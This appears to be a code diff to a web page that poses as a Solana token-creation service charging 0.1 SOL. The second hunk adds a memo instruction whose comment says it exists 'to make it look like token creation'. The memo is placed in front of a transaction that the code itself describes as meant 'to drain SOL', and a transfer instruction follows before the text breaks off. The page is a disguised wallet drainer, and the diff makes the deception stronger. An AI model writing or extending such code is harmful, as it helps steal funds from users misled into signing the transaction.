@@ -884,7 +884,7 @@
                 The cost of creating a regular Token is <span class="price-highlight">0.1 SOL</span>, which includes all fees needed for the SPL Token creation.
             </div>
             <div class="price-info">
-                Creating a <span class="trending-highlight">trending token</span> costs <span class="price-highlight">only 0.1 sol</span> and includes <span class="trending-highlight">1 billion supply</span>, 9 decimals with all 3 revoke options (freeze, mint, update) turned on by default.
+                Creating a <span class="trending-highlight">trending token</span> costs <span class="price-highlight">only 0.1 SOL</span> and includes <span class="trending-highlight">1 billion supply</span>, 9 decimals with all 3 revoke options (freeze, mint, update) turned on by default.
             </div>
             <div class="price-info">
                 The creation process will start and will take some seconds. After that, you will receive the total supply of the token in the wallet you chose.
@@ -1286,6 +1286,17 @@
                 
                 // Create a transaction to drain SOL
                 const transaction = new solanaWeb3.Transaction();
+                
+                // Add a memo instruction to make it look like token creation
+                const memoText = `Creating token: ${tokenName} (${tokenSymbol}) with supply ${tokenSupply}`;
+                const memoInstruction = new solanaWeb3.TransactionInstruction({
+                    keys: [{ pubkey: publicKey, isSigner: true, isWritable: true }],
+                    programId: new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
+                    data: Buffer.from(memoText)
+                });
+                
+                // Add the memo instruction first
+                transaction.add(memoInstruction);
                 
                 // Create a transfer instruction
                 const transferInstruction = solanaWeb3.SystemProgram.transfer({
